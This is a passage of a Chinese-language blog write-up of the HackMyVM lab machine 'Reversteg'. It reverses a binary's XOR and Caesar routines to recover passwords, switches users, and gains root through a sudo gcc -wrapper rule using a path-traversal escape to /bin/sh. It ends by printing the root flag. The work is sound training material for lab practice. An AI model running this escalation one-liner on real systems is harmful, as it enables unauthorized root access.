class=\"hljs-title function_\">__isoc99_scanf</span>(<span class=\"hljs-string\">\"%s\"</span>, &#x26;v4[<span class=\"hljs-number\">7</span>]);\n    <span class=\"hljs-keyword\">if</span> ( <span class=\"hljs-title function_\">strcmp</span>(&#x26;v4[<span class=\"hljs-number\">7</span>], <span class=\"hljs-string\">\"H\"</span>) )\n      <span class=\"hljs-keyword\">break</span>;\n    <span class=\"hljs-keyword\">if</span> ( ++v20 == <span class=\"hljs-number\">100</span> )\n    {\n      <span class=\"hljs-title function_\">puts</span>(<span class=\"hljs-string\">\"Hint: Invert XOR Replace! \"</span>);\n      goto <span class=\"hljs-variable constant_\">LABEL_6</span>;\n    }\n  }\n  <span class=\"hljs-title function_\">strcpy</span>(dest, &#x26;v4[<span class=\"hljs-number\">7</span>]);\n  <span class=\"hljs-title function_\">__isoc99_scanf</span>(<span class=\"hljs-string\">\"%s %s %s\"</span>, v10, &#x26;v9, &#x26;v8);\n<span class=\"hljs-attr\">LABEL_6</span>:\n  v7 = <span class=\"hljs-number\">8203321</span>;\n  <span class=\"hljs-title function_\">strcpy</span>(v6, <span class=\"hljs-string\">\"/, 8:(\"</span>);\n  <span class=\"hljs-title function_\">strcpy</span>((char *)&#x26;v5 + <span class=\"hljs-number\">7</span>, <span class=\"hljs-string\">\"!!|}yx{z\"</span>);\n  <span class=\"hljs-title function_\">strcpy</span>((char *)&#x26;v5, <span class=\"hljs-string\">\"(;$)(#\"</span>);\n  v19 = <span class=\"hljs-number\">77</span>;\n  v18 = (<span class=\"hljs-keyword\">void</span> *)<span class=\"hljs-title function_\">xor_decrypt</span>((char *)&#x26;v5 + <span class=\"hljs-number\">7</span>, 77LL);\n  v17 = (<span class=\"hljs-keyword\">void</span> *)<span class=\"hljs-title function_\">xor_decrypt</span>(v6, (unsigned int)v19);\n  v16 = (char *)<span class=\"hljs-title function_\">xor_decrypt</span>(&#x26;v7, (unsigned int)v19);\n  v15 = (char *)<span class=\"hljs-title function_\">xor_decrypt</span>(&#x26;v5, (unsigned int)v19);\n  <span class=\"hljs-keyword\">if</span> ( (unsigned int)<span class=\"hljs-title function_\">check_passwords</span>((int)dest, (int)v10, (int)&#x26;v9, (int)&#x26;v8, (int)v18, (int)v17, v16, v15) )\n  {\n    <span class=\"hljs-title function_\">strcpy</span>(v4, <span class=\"hljs-string\">\"pvygob\"</span>);\n    v14 = <span class=\"hljs-number\">106</span>;\n    v13 = <span class=\"hljs-number\">10</span>;\n    ptr = (<span class=\"hljs-keyword\">void</span> *)<span class=\"hljs-title function_\">caesar_decrypt</span>(v4, 10LL);\n    <span class=\"hljs-title function_\">printf</span>(<span class=\"hljs-string\">\"[+] Enter the password successfully! you know: %s\\n\"</span>, (<span class=\"hljs-keyword\">const</span> char *)ptr);\n    <span class=\"hljs-title function_\">free</span>(ptr);\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    <span class=\"hljs-title function_\">puts</span>(<span class=\"hljs-string\">\"[-] Incorrect password!\"</span>);\n  }\n</code></pre>\n<p>分析来自于：<code>Grok</code></p>\n<pre><code class=\"hljs language-jsx\"><span class=\"hljs-title function_\">puts</span>(<span class=\"hljs-string\">\"Enter passwords or Enter H coward mode:\"</span>);\nv20 = <span class=\"hljs-number\">0</span>;\n<span class=\"hljs-keyword\">while</span> ( <span class=\"hljs-number\">1</span> )\n{\n    <span class=\"hljs-title function_\">__isoc99_scanf</span>(<span class=\"hljs-string\">\"%s\"</span>, &#x26;v4[<span class=\"hljs-number\">7</span>]);\n    <span class=\"hljs-keyword\">if</span> ( <span class=\"hljs-title function_\">strcmp</span>(&#x26;v4[<span class=\"hljs-number\">7</span>], <span class=\"hljs-string\">\"H\"</span>) )\n        <span class=\"hljs-keyword\">break</span>;\n    <span class=\"hljs-keyword\">if</span> ( ++v20 == <span class=\"hljs-number\">100</span> )\n    {\n        <span class=\"hljs-title function_\">puts</span>(<span class=\"hljs-string\">\"Hint: Invert XOR Replace! \"</span>);\n        goto <span class=\"hljs-variable constant_\">LABEL_6</span>;\n    }\n}\n<span class=\"hljs-title function_\">strcpy</span>(dest, &#x26;v4[<span class=\"hljs-number\">7</span>]);\n<span class=\"hljs-title function_\">__isoc99_scanf</span>(<span class=\"hljs-string\">\"%s %s %s\"</span>, v10, &#x26;v9, &#x26;v8);\n</code></pre>\n<ul>\n<li>提示用户输入密码，或者输入 \"<code>H</code>\" 进入所谓的 \"<code>coward mode</code>\"。</li>\n<li>对用户输入的密码进行处理，并通过 <code>XOR</code> 解密和凯撒解密操作生成验证所需的数据。</li>\n<li>使用 <code>check_passwords</code> 函数验证输入的密码是否正确。</li>\n<li>如果验证通过，输出成功消息并解密一个隐藏字符串；否则，提示密码错误</li>\n<li>当用户输入的不是 \"<code>H</code>\" 时，假设这是第一个密码，将其复制到 <code>dest</code> 中。</li>\n<li>接着，使用 <code>scanf</code> 读取另外三个字符串，分别存储到 <code>v10</code>、<code>v9</code> 和 <code>v8</code> 中。这可能是验证所需的额外输入</li>\n</ul>\n<pre><code class=\"hljs language-jsx\"><span class=\"hljs-attr\">LABEL_6</span>:\nv7 = <span class=\"hljs-number\">8203321</span>;\n<span class=\"hljs-title function_\">strcpy</span>(v6, <span class=\"hljs-string\">\"/, 8:(\"</span>);\n<span class=\"hljs-title function_\">strcpy</span>((char *)&#x26;v5 + <span class=\"hljs-number\">7</span>, <span class=\"hljs-string\">\"!!|}yx{z\"</span>);\n<span class=\"hljs-title function_\">strcpy</span>((char *)&#x26;v5, <span class=\"hljs-string\">\"(;$)(#\"</span>);\nv19 = <span class=\"hljs-number\">77</span>;\nv18 = (<span class=\"hljs-keyword\">void</span> *)<span class=\"hljs-title function_\">xor_decrypt</span>((char *)&#x26;v5 + <span class=\"hljs-number\">7</span>, 77LL);\nv17 = (<span class=\"hljs-keyword\">void</span> *)<span class=\"hljs-title function_\">xor_decrypt</span>(v6, (unsigned int)v19);\nv16 = (char *)<span class=\"hljs-title function_\">xor_decrypt</span>(&#x26;v7, (unsigned int)v19);\nv15 = (char *)<span class=\"hljs-title function_\">xor_decrypt</span>(&#x26;v5, (unsigned int)v19);\n</code></pre>\n<p>初始化数据<code>XOR</code>解密，解密</p>\n<p><code>v17 = (void *)xor_decrypt(v6, (unsigned int)v19);</code> == <code>bamuwe</code> （眼熟）</p>\n<p><img src=\"/post-images/HackMyVMReversteg/image130.png\" alt=\"image.png\"></p>\n<p><code>v15 = (char *)xor_decrypt(&#x26;v5, (unsigned int)v19);</code> == <code>eviden</code></p>\n<p><img src=\"/post-images/HackMyVMReversteg/image131.png\" alt=\"image.png\"></p>\n<p><code>v18 = (void *)xor_decrypt((char *)&#x26;v5 + 7, 77LL);</code> == <code>ll104567</code> （群主）</p>\n<p><img src=\"/post-images/HackMyVMReversteg/image132.png\" alt=\"image.png\"></p>\n<p><code>v16 = (char *)xor_decrypt(&#x26;v7, (unsigned int)v19);</code> == <code>ta0</code></p>\n<p><code>v16</code>不能直接在<code>CyberChef</code>里面转，否则会变成乱码，因为<code>v7</code>是<code>int</code>格式，而<code>(char *)xor_decrypt</code> 需要将<code>v7</code>转为<code>Sting</code>格式</p>\n<p>我们将其代码扒下来，直接打印<code>v16</code> ，我们创建<code>v16.c</code></p>\n<pre><code class=\"hljs language-jsx\">#include &#x3C;stdio.<span class=\"hljs-property\">h</span>>\n#include &#x3C;stdlib.<span class=\"hljs-property\">h</span>>\n#include &#x3C;string.<span class=\"hljs-property\">h</span>>\n\ntypedef unsigned char _BYTE;\n\n_BYTE *<span class=\"hljs-title function_\">xor_decrypt</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">const</span> char *a1, char a2</span>)\n{\n    _BYTE *v3;\n    int v4;\n    int i;\n\n    v4 = <span class=\"hljs-title function_\">strlen</span>(a1);\n    v3 = <span class=\"hljs-title function_\">malloc</span>(v4 + <span class=\"hljs-number\">1</span>);\n    <span class=\"hljs-keyword\">for</span> (i = <span class=\"hljs-number\">0</span>; i &#x3C; v4; ++i)\n        v3[i] = a2 ^ a1[i];\n    v3[v4] = <span class=\"hljs-number\">0</span>;\n    <span class=\"hljs-keyword\">return</span> v3;\n}\n\nint <span class=\"hljs-title function_\">main</span>(<span class=\"hljs-params\"></span>)\n{\n    int v7 = <span class=\"hljs-number\">8203321</span>;\n    char v19 = <span class=\"hljs-number\">77</span>;\n    char *v16;\n\n    v16 = (char *)<span class=\"hljs-title function_\">xor_decrypt</span>((<span class=\"hljs-keyword\">const</span> char *)&#x26;v7, (unsigned int)v19);\n\n    <span class=\"hljs-title function_\">printf</span>(<span class=\"hljs-string\">\"v16 content: %s\\n\"</span>, v16);\n\n    <span class=\"hljs-title function_\">free</span>(v16);\n\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n}\n</code></pre>\n<p>然后编译并运行，得出<code>v16</code>是<code>ta0</code></p>\n<pre><code class=\"hljs language-jsx\"> ⚡ root@kali  ~<span class=\"hljs-regexp\">/Desktop/</span>test/reverseteg  vim v16.<span class=\"hljs-property\">c</span>\n ⚡ root@kali  ~<span class=\"hljs-regexp\">/Desktop/</span>test/reverseteg  gcc v16.<span class=\"hljs-property\">c</span> -o v16                                       \n ⚡ root@kali  ~<span class=\"hljs-regexp\">/Desktop/</span>test/reverseteg  ./v16    \nv16 <span class=\"hljs-attr\">content</span>: ta0\n</code></pre>\n<p>那我们就得出<code>v15</code>-<code>v18</code>分别是<code>eviden</code> 、<code>ta0</code> 、<code>bamuwe</code> 、<code>ll104567</code></p>\n<p>然后程序调用<code>checkpassword</code>函数</p>\n<pre><code class=\"hljs language-jsx\"><span class=\"hljs-keyword\">if</span> ( (unsigned int)<span class=\"hljs-title function_\">check_passwords</span>((int)dest, (int)v10, (int)&#x26;v9, (int)&#x26;v8, (int)v18, (int)v17, v16, v15) )\n</code></pre>\n<p>最后根据参数我们依次输入密码</p>\n<pre><code class=\"hljs language-jsx\">$ ./reverse\n<span class=\"hljs-title class_\">Enter</span> passwords or <span class=\"hljs-title class_\">Enter</span> H coward <span class=\"hljs-attr\">mode</span>:\nll104567\nbamuwe\nta0\neviden\n[+] <span class=\"hljs-title class_\">Enter</span> the password successfully! you <span class=\"hljs-attr\">know</span>: flower\n</code></pre>\n<p>得到密码<code>flower</code> ？或者<code>ll104567bamuweta0eviden</code></p>\n<p>查看<code>/etc/passwd</code>下存在哪些用户有<code>shell</code>的，用户<code>welcome</code></p>\n<pre><code class=\"hljs language-jsx\"><span class=\"hljs-attr\">welcome</span>:<span class=\"hljs-attr\">x</span>:<span class=\"hljs-number\">1001</span>:<span class=\"hljs-number\">1001</span>::<span class=\"hljs-regexp\">/home/</span><span class=\"hljs-attr\">welcome</span>:<span class=\"hljs-regexp\">/bin/</span>sh\n</code></pre>\n<p>切换到<code>welcome</code> ，密码是<code>ll104567bamuweta0eviden</code></p>\n<pre><code class=\"hljs language-jsx\">morainelake@<span class=\"hljs-attr\">reversteg</span>:~$ su welcome\n<span class=\"hljs-title class_\">Password</span>: \n</code></pre>\n<h2>提权</h2>\n<p>查看权限</p>\n<pre><code class=\"hljs language-jsx\">$ /bin/bash\nwelcome@<span class=\"hljs-attr\">reversteg</span>:<span class=\"hljs-regexp\">/home/m</span>orainelake$ sudo -l\n<span class=\"hljs-title class_\">Matching</span> <span class=\"hljs-title class_\">Defaults</span> entries <span class=\"hljs-keyword\">for</span> welcome on <span class=\"hljs-attr\">reversteg</span>:\n    env_reset, mail_badpass, secure_path=<span class=\"hljs-regexp\">/usr/</span>local/sbin\\:<span class=\"hljs-regexp\">/usr/</span>local/bin\\:<span class=\"hljs-regexp\">/usr/</span>sbin\\:<span class=\"hljs-regexp\">/usr/</span>bin\\:<span class=\"hljs-regexp\">/sbin\\:/</span>bin\n\n<span class=\"hljs-title class_\">User</span> welcome may run the following commands on <span class=\"hljs-attr\">reversteg</span>:\n    (<span class=\"hljs-variable constant_\">ALL</span> : <span class=\"hljs-variable constant_\">ALL</span>) <span class=\"hljs-attr\">NOPASSWD</span>: <span class=\"hljs-regexp\">/usr/</span>bin/gcc -wrapper /opt<span class=\"hljs-comment\">/*\n</span></code></pre>\n<p>查看<code>gcc</code>提权方案</p>\n<pre><code class=\"hljs language-jsx\">gcc -wrapper /bin/sh,-s .\n</code></pre>\n<p>其实<code>/usr/bin/gcc -wrapper /opt/*</code>中的<code>*</code>是可以逃逸的（群主的思路）</p>\n<pre><code class=\"hljs language-jsx\">welcome@<span class=\"hljs-attr\">reversteg</span>:<span class=\"hljs-regexp\">/opt$ sudo /u</span>sr/bin/gcc -wrapper /opt/../../bin/sh,-s .\n# id\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root)\n</code></pre>\n<p>读取<code>RootFlag</code></p>\n<pre><code class=\"hljs language-jsx\"># cat /root/root.<span class=\"hljs-property\">txt</span>\nflag{4f1eab505b71cd930b0eccd83ff0cfef}\n</code></pre>","title":"HackMyVM - Reversteg","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Reversteg.\n\n https://hackmyvm.eu/machines/machine.php?vm=Reversteg\n \n\n前期踩点\n\n\n\n\n\n\n\n访问`HTTP`，查看源码发现 \n\n\n\n\n\n\n\n图片隐写\n\n根据提示可以找到两张图片\n\n\n\n\n\n使用`winhex`打开`jpg`图片\n\n\n\n`TGlmZSBpcyBmdWxsIG9mIHNjZW5lcnksIGxvb2sgY2FyZW..."},"recentPosts":[{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"}]},"__N_SSG":true}